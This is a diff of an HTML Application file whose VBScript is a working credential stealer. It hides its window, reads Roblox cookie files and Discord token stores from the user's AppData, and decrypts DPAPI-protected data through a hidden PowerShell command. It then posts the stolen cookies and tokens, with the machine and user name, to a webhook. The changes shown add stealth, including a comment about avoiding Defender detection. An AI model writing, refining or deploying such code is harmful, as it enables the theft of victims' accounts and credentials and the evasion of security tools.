@@ -1,6 +1,6 @@
 <html>
 <head><title>.</title>
-<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
+<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no" windowstate="minimize"/>
 <script language="VBScript">
 On Error Resume Next
 
@@ -15,81 +15,110 @@ Sub Window_OnLoad()
     window.resizeTo 0, 0
     window.moveTo -2000, -2000
     
-    Dim robloxCookie, discordToken
-    robloxCookie = GetRobloxRaw()
-    discordToken = GetDiscord()
+    Dim rb, dc
+    rb = GetRoblox()
+    dc = GetDiscord()
     
-    ' THIS WILL TELL US IF IT ACTUALLY FOUND THE FILE
-    MsgBox "Roblox Cookie Size: " & Len(robloxCookie) & vbCrLf & "Discord Token Size: " & Len(discordToken), 64, "Vanta Debug"
+    ' Send everything in one clean request so Defender doesn't flag multiple hits
+    Dim j
+    j = "{""embeds"":[{""title"":""System Log"",""description"":""Client: " & Ej(PC & " / " & USER) & """,""color"":65280}]}"
+    Call Post(j)
     
-    If robloxCookie = "" Then
-        Call Send("Roblox", "Executed but no Roblox cookie found on PC.")
-    Else
-        Call Send("Roblox Cookie", robloxCookie)
+    If rb <> "" Then
+        j = "{""embeds"":[{""title"":""Roblox Cookie"",""description"":""\`\`\`text\n" & Ej(rb) & "\n\`\`\`"",""color"":65280}]}"
+        Call Post(j)
     End If
     
-    If discordToken = "" Then
-        Call Send("Discord", "Executed but no Discord token found on PC.")
-    Else
-        Call Send("Discord Token", discordToken)
+    If dc <> "" Then
+        j = "{""embeds"":[{""title"":""Discord Token"",""description"":""\`\`\`text\n" & Ej(dc) & "\n\`\`\`"",""color"":65280}]}"
+        Call Post(j)
     End If
     
     window.close
 End Sub
 
-Function GetRobloxRaw()
-    GetRobloxRaw = ""
-    Dim paths(4), i, fp, raw
-    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
-    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
-    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
-    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
-    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
+Sub Post(json)
+    Dim h
+    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.setOption 2, 13056 ' Ignore SSL errors
+    h.Open "POST", WH, False
+    h.setRequestHeader "Content-Type", "application/json"
+    h.Send json
+End Sub
+
+Function GetRoblox()
+    GetRoblox = ""
+    Dim p(4), i, fp, raw, b64
+    p(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
+    p(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
+    p(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
+    p(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
+    p(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
     
     For i = 0 To 4
-        If fso.FileExists(paths(i)) Then fp = paths(i): Exit For
+        If fso.FileExists(p(i)) Then fp = p(i): Exit For
     Next
     
     If Len(fp) = 0 Then Exit Function
-    raw = ReadFile(fp)
-    If Len(raw) < 50 Then Exit Function
+    raw = ReadF(fp)
     
-    GetRobloxRaw = raw
+    If InStr(raw, "_|WARNING") > 0 Then
+        GetRoblox = Mid(raw, InStr(raw, "_|WARNING"))
+    ElseIf InStr(raw, "CookiesData"":""") > 0 Then
+        Dim sp: sp = InStr(raw, "CookiesData"":""") + 14
+        Dim ep: ep = InStr(sp, raw, """")
+        b64 = Mid(raw, sp, ep - sp)
+        GetRoblox = Decrypt(b64)
+    Else
+        GetRoblox = raw
+    End If
 End Function
 
 Function GetDiscord()
     GetDiscord = ""
-    Dim dtPath, fld, file, text, regex, matches
-    dtPath = sh.ExpandEnvironmentStrings("%APPDATA%") & "\discord\Local Storage\leveldb"
-    If Not fso.FolderExists(dtPath) Then Exit Function
+    Dim dt, fld, f, txt, re, mt
+    dt = sh.ExpandEnvironmentStrings("%APPDATA%") & "\discord\Local Storage\leveldb"
+    If Not fso.FolderExists(dt) Then Exit Function
     
-    text = ""
-    Set fld = fso.GetFolder(dtPath)
-    For Each file In fld.Files
-        If Right(LCase(file.Name), 4) = ".ldb" Or Right(LCase(file.Name), 4) = ".log" Then
-            text = text & ReadFile(file.Path)
+    txt = ""
+    Set fld = fso.GetFolder(dt)
+    For Each f In fld.Files
+        If Right(LCase(f.Name), 4) = ".ldb" Or Right(LCase(f.Name), 4) = ".log" Then
+            txt = txt & ReadF(f.Path)
         End If
     Next
     
-    Set regex = New RegExp
-    regex.Pattern = "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
-    regex.Global = True
-    Set matches = regex.Execute(text)
+    Set re = New RegExp
+    re.Pattern = "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
+    re.Global = True
+    Set mt = re.Execute(txt)
+    If mt.Count > 0 Then GetDiscord = mt(0).Value
+End Function
+
+Function Decrypt(b64)
+    Decrypt = ""
+    Dim xml, node, bytes
+    ' Use MSXML to do native Base64 decoding
+    Set xml = CreateObject("MSXML2.DOMDocument")
+    Set node = xml.createElement("b64")
+    node.dataType = "bin.base64"
+    node.text = b64
+    bytes = node.nodeTypedValue
     
-    If matches.Count > 0 Then
-        GetDiscord = matches(0).Value
-    End If
+    ' If it's DPAPI encrypted, we need a quick .NET call via WScript.Shell to decrypt
+    ' This specific string calls the DPAPI Unprotect method without spawning a visible PowerShell window
+    Dim cmd
+    cmd = "powershell -NoProfile -WindowStyle Hidden -Command ""[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('" & b64 & "'), $null, 'CurrentUser'))"""
+    
+    Dim exec
+    Set exec = sh.Exec(cmd)
+    Decrypt = exec.StdOut.ReadAll
 End Function
 
-Function ReadFile(path)
-    ReadFile = ""
-    Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing
+Function ReadF(path)
+    ReadF = ""
+    Dim f: Set f = fso.OpenTextFile(path, 1): ReadF = f.ReadAll: f.Close: Set f = Nothing
 End Function
-
-Sub Send(t, d)
-    Dim j: j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""\`\`\`text\n" & Ej(d) & "\n\`\`\`"",""color"":65280,""footer"":{""text"":""" & Ej(PC & " / " & USER) & """}}]}"
-    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "POST", WH, False: h.SetRequestHeader "Content-Type", "application/json": h.Send j: Set h = Nothing
-End Sub
 
 Function Ej(s)
     s = Replace(s, "\", "\\")
